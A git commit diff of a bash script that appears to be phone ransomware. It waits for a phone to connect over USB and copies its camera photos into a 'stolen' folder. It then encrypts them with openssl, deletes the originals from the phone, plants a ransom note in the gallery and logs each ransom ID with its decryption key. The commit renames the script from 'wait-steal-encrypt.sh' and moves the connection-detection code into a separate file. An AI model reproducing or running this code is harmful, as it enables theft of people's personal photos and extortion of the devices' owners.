5a1946dc22618a5d56805fb388c9a8220d5258b3
grant273 <grant.klich@gmail.com>
2017-01-31 23:47:56 -0500

    Update and rename wait-steal-encrypt.sh to encrypt-on-plugin.sh

--- encrypt-on-plugin.sh
+++ encrypt-on-plugin.sh
@@ -1,33 +1,9 @@
 #!/bin/bash
-#This script will wait for a phone to be plugged in, steal its camera photos, and encrypt them
+#This script will wait for a phone to be plugged in and encrypt its camera photos
 
-#wait until phone is connected (not mounted)
-LOCALPATH=$(pwd)
 oldusblist=$(lsusb)
-usbcount=$(lsusb | wc -l) 
-newcount=$usbcount
-
-echo 'Waiting for connection...'
-while [ $usbcount -eq $newcount ]; do	
-	newcount=$(lsusb | wc -l)
-done
-
-#mount phone
-gvfs-mount -li | awk -F= '{if(index($2,"mtp") == 1)system("gvfs-mount "$2)}'
-
-#waits/checks if unlocked
-echo 'Connected. Waiting for unlock...'
-until [ -d /run/user/$UID/gvfs/mtp*/* ]; do	
-	:
-done
-
-#navigates and tests access to file system
-cd /run/user/$UID/gvfs/mtp*/*
-ls
-echo 'FILE SYSTEM ACCESSED!'
-
-cd "$LOCALPATH"
-
+"./wait-for-phone.sh"
+LOCALPATH=$(pwd)
 PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/Camera)
 echo $PHONEPATH
 
@@ -65,10 +41,11 @@ do
 		echo "transferring and encrypting $f ($currentfile/$filecount)..."
 		gvfs-copy "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
 		openssl aes-256-cbc -a -salt -in "$LOCALPATH/data/stolen/$TRANSDIR/$f" -out "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" -k $enc_key
-		touch -r "$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" #give same timestamps to new encrypted file as old file
+		touch -r "$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" #give same timestamps to new encrypted file as old file, if supported
 		touch -r "$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f" #same timestamp to copied file
 		gvfs-copy "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" .		
 		rm $f
+		rm "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg"
 		currentfile=$((currentfile+1))
 	fi
 
@@ -78,6 +55,7 @@ sleep 1
 gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png" #re-copy note so it shows up first in gallery
 
 echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_key >> keys/keys.txt #store ransomid and encryption key pair
+echo ""
 echo Encryption complete. check keys/keys.txt for ransom id and key
-echo Transferred photos stored in data/stolen/$TRANSDIR
+echo Transferred photos stored in "data/stolen/$TRANSDIR"
 echo ""
